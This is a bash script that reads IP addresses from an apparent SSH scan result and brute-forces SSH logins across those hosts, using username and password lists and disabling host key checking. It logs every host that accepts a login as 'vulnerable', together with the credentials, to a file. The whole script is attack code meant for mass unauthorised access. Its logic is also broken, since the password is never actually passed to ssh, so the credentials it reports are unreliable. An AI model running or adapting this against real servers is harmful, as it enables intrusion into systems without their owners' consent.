#!/bin/bash
# (c) J~Net 2024
#

awk '/Host:/ {match($0, /[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/, ip); if (ip[0]) print ip[0]}' opensshhosts.txt > hosts.txt


# File containing usernames
usernamefile="usernames.txt"
# File containing passwords
passwordfile="passwords.txt"
# Function to check SSH connectivity
check_ssh() {
    ssh -o StrictHostKeyChecking=no -q -t $1@$2 "echo 'Connected Successfully'" 2>/dev/null
}


# Read open hosts from the file
while read host; do
    # Read usernames from the file
    while read username; do
        # Read passwords from the file
        while read password; do
            if check_ssh $username $host; then
                echo "Found vulnerable host: $host"
                echo "Username: $username"
                echo "Password: $password"
                # Log the findings to a file
                echo "$host:$username:$password" >> vulnerablehosts.txt
            fi
        done < $passwordfile
    done < $usernamefile
done < hosts.txt

sudo chown $USER *.*

